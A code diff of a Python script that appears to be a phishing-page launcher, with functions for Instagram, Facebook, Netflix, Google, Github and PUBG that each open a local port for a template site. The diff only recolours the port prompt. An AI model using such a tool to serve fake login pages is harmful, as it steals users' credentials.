@@ -127,7 +127,7 @@ def instagram():
 
 #====================================================================================================
     try:
-        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.GREEN}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
+        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
@@ -244,7 +244,7 @@ def facebook():
     os.chdir(rf"{path}/facebook")
 #====================================================================================================
     try:
-        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET))
+        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
@@ -358,7 +358,7 @@ def netflix():
     os.chdir(rf"{path}/Netflix")
 #====================================================================================================
     try:
-        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET))
+        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
@@ -474,7 +474,7 @@ def Google():
     os.chdir(rf"{path}/Google")
 #====================================================================================================
     try:
-        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET))
+        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
@@ -588,7 +588,7 @@ def Github():
     os.chdir(rf"{path}/Github")
 #====================================================================================================
     try:
-        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET))
+        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
@@ -703,7 +703,7 @@ def Pubg():
     os.chdir(rf"{path}/Pubg")
 #====================================================================================================
     try:
-        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET))
+        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
